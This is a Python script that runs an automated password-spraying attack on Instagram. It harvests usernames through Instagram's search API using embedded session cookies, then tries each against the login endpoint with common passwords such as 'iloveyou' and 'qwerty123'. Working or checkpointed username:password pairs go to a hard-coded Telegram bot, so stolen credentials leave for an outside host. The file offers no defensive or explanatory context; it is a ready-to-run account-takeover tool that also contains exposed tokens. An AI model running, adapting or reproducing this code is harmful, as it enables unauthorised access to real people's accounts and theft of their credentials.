import requests, json, random, time, uuid
from uuid import uuid4

Z = '\033[1;31m'
X = '\033[1;33m'
F = '\033[1;32m'
na = 0
while True:
	
	us = str(''.join(random.choice('qwertyuioplkjhgfdsazxcvbnm')for i in range(4)))
	
	h = ["abc123","iloveyou","1q2w3e4r","qwerty123","qwertyuiop","superman","asdfghjkl","Aa123123","Aa112233"]
	pas = random.choice(h)
	
	
	headers = {"User-Agent": "Mozilla/5.0",
"x-ig-app-id": "1217981644879628",
'Cookie': "ig_did=B08C1890-FA0C-4A42-8C93-DA83B8A31108; ig_nrcb=1; mid=aLiP4wABAAGKfudaG_ey8RFIq-vu; datr=6o-4aHpywx4UrM5ufugc-MY_; ps_l=1; ps_n=1; csrftoken=1gepJR2QhG94ZDrcCzUEH9VV27N2ZNyD; ds_user_id=76596311600; sessionid=76596311600%3AXqI1S62OQcNVWF%3A15%3AAYgiEBT27QAi-QgWquDL4WrfKDa7RZioiobHR570Rw; dpr=2.762500047683716; wd=434x857; rur=\"RVA\\05476596311600\\0541789710561:01fef1cc85242778f3fec4c43c6d754f3396c19004c6d10eeb67fc69eb968fd7c8b55be4\""}

	req = requests.get(f'https://www.instagram.com/api/v1/web/search/topsearch/?query={us}', headers=headers).json()
	
	for user in req.get("users", []):
		userr = user["user"]["username"]
		
		payload = {'signed_body': "SIGNATURE.{\"enc_password\":\"#PWD_INSTAGRAM:0:"+str(int(time.time()))+":"+pas+"\",\"username\":\""+userr+"\",\"adid\":\"\",\"guid\":\""+str(uuid4())+"\",\"device_id\":\"android-"+str(uuid4())[:16]+"\",\"google_tokens\":\"[]\",\"login_attempt_count\":\"0\"}"}
		
		headers = {'User-Agent': "Instagram 237.0.0.14.102 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; Redmi Note 8 Pro; begonia; mt6785; ar_EG; 373310554)", 
'x-bloks-version-id': "8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07",
'x-ig-app-id': "567067343352427",
'priority': "u=3",
'accept-language': "ar-EG, en-US"}
		
		r = requests.post('https://i.instagram.com/api/v1/accounts/login/', data=payload, headers=headers).json()
		
		if "logged_in_user" in r:
			print(f'{F}✅Good account {userr}:{pas}')
			requests.get("https://api.telegram.org/bot"+str('6498578702:AAEdDgRmNXirjZyFJf_B0_uI3GGaaoIn75A')+"/sendMessage?chat_id="+str('5376094649')+"&text="+str(f'''{userr}:{pas}'''))
		
		elif r.get("error_type")=="checkpoint_challenge_required":
			print(f'{X}Secure  {userr}:{pas}')
			requests.get("https://api.telegram.org/bot"+str('6498578702:AAEdDgRmNXirjZyFJf_B0_uI3GGaaoIn75A')+"/sendMessage?chat_id="+str('5376094649')+"&text="+str(f'''{userr}:{pas}'''))
		
		elif r.get("error_type")=="bad_password" or r.get("invalid_credentials"):
			na +=1
			print(f'{Z}[{na}]Bad pass {userr}:{pas}')

		else:
			print(f'{Z}Erorr {r}')
